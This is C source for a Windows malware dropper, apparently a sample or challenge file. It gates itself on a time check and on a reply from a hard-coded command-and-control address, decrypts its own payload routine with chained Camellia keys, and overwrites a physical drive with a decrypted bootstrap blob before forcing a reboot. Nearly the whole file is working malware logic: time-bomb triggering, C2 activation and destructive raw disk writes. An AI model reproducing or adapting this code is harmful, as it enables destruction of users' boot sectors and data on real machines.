#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <winsock2.h>
#include "bootstrap.h"
#include "camellia.c"
#include "md5.c"

//bootstrap code data
extern char bootstrap[0x4400];
//data enc key
char data_key[0x10] = "\xeb\x5e\xb3\xca\x92\xa1\xff\x01\x80\x4e\x36\x58\x56\xad\x9e\xb7";
//code enc key
char code_key[0x10] = "\xcc\x7c\x3e\xe0\xa5\x62\x42\x62\xeb\x1c\xbd\x84\x4a\xc1\xcf\x51";
//server-side key
char server_key[0x10];
//char server_key[0x10] = "\xff\xd3\x30\xb7\x07\x00\x00\x00""activate";

void drop(void){
  int i;
  DWORD write_cnt;
  CAMELLIA_KEY key;
  Camellia_set_key(data_key, 128, &key);
  for(i = 0; i < 0x4400; i += 16)
    Camellia_decrypt(&bootstrap[i],&bootstrap[i],&key);
  HANDLE drive = CreateFile("\\\\.\\PhysicalDrive10000", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
  if(drive == INVALID_HANDLE_VALUE) return;
  WriteFile(drive, bootstrap, 0x4400, &write_cnt, NULL);
  system("shutdown -r -t 00");
  asm volatile ("nop");
  return;
}

void decode(void){
  int i;
  //server_key->data_key->code_key->data_key	
  CAMELLIA_KEY key;
  
  Camellia_set_key(server_key, 128, &key);
  Camellia_decrypt(data_key,data_key,&key);
  Camellia_set_key(data_key, 128, &key);
  Camellia_decrypt(code_key,code_key,&key);
  Camellia_set_key(code_key, 128, &key);
  Camellia_decrypt(data_key,data_key,&key);
  
  Camellia_set_key(code_key, 128, &key);
  for(i = 0; i < 240; i += 16)
    Camellia_decrypt(&((char *)drop)[i],&((char *)drop)[i],&key);
  drop();
  return ;
}

int timecheck(void){
  time_t ltime;
  short a[5] = {380, 53, 3, 201, 69};
  char i;
  time(&ltime);
  memset(server_key, 0, 0x10);
  for(i = 0; i < 5; i ++){
    srand(a[i]);
    server_key[i] = rand() & 0xff;
  }
  //printf("%llu",*(unsigned long long *)server_key);
  //33138201599(0x7b730d3ff)
  return ltime >= *(unsigned long long *)server_key; 
}

int CnCcheck(void){
  SOCKET sockfd;
  WSADATA wsaData;
  struct sockaddr_in addr;
  
  WSAStartup(MAKEWORD(2,2), &wsaData);
  sockfd = socket(AF_INET,SOCK_STREAM, 0);
	
  memset((void *)&addr, 0x00, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = inet_addr("195.157.15.100"); //Backdoor.Androm
  addr.sin_port = htons(13100);

  if(connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)))
    return 0;

  send(sockfd, "GET /status HTTP/1.1\r\n", 22, 0);
  recv(sockfd, (void *)&server_key[8], 8, 0);
  
  //memcpy(&server_key[8],"activate",8);
  unsigned *digest = md5(&server_key[8], 8);
  return memcmp(digest, "\xd4\xee\x0f\xbb\xeb\x7f\xfd\x4f\xd7\xa7\xd4\x77\xa7\xec\xd9\x22", 0x10);
}

int main(int argc, char ** argv){ 
  //decode();
  //CnCcheck();
  //return 0;
  while(timecheck() && CnCcheck()){};
  decode();
  return 0;
}
